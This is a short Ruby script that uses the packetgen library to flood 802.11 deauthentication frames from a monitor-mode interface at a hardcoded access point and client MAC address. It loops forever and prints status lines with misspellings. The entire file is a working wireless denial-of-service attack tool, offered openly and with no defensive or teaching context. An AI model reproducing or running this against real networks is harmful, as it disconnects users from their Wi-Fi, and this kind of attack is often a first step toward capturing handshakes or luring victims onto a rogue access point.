require 'packetgen'


#2C:AB:00:A9:6C:64 BSSID
#C0:EE:FB:33:E2:09 CLIENT


def main
    packnum = "100000000000000"
    iface, bssid, client = [
    'mon0',               # Interface - monitoring mode
    '2C:AB:00:A9:6C:64',  # Acesss Point
    'C0:EE:FB:33:E2:09'   # Destination 
    ]
    while true
        pkt = PacketGen.gen('RadioTap').
                        add('Dot11::Management', mac1: client, mac2: bssid, mac3: bssid).
                        add('Dot11::DeAuth', reason: 7)
        puts "Sedning Defualt Amount  -> " + packnum 
        puts "[+] Sending Deauth Using --> " + iface + ' to Acess Point --> ' + bssid + 'Too Client --> ' + client 
        pkt.to_w(iface, calc: true, number: 100000000000000, interval: 0.2)
    end
end

main()